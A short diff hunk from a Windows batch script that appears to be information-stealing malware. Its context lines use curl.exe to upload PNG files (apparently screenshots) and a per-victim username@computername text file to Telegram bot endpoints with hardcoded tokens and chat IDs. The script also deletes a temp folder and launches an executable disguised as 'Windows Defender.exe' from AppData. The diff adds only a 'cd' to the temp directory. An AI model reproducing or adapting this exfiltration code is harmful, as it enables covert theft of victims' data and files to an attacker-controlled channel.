@@ -75,6 +75,7 @@ curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition
 for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
 curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure
 
+cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
 "%AppData%\Microsoft\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
